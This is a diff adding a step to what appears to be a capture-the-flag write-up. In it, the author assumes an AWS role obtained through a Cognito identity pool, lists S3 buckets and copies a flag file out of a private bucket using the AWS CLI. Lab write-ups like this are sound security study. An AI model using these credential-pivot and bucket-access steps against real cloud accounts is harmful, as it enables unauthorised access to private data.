@@ -105,3 +105,20 @@ $ aws sts assume-role-with-web-identity --role-arn arn:aws:iam::092297851374:rol
 <img width="1414" height="912" alt="image" src="https://github.com/user-attachments/assets/8d516537-25ee-44fe-b488-f8fc9b322812" />
 
 > In the middle, I added aws session key of previous challenge so to avoid confusion added a block 😅
+
+### 4. Now, we have assumed role of `arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role` which is mentioned in the question.
+
+The name says S3 access, let's try listing S3:
+```
+$ aws s3 ls
+```
+
+<img width="728" height="263" alt="image" src="https://github.com/user-attachments/assets/0463fb55-8788-423b-b626-747a135dfdf8" />
+
+<img width="1416" height="275" alt="image" src="https://github.com/user-attachments/assets/fef4a5b2-8e6e-40bd-9cae-bccb65a766a1" />
+
+```bash
+$ aws s3 cp s3://wiz-privatefiles-x1000/flag2.txt - | cat
+```
+
+
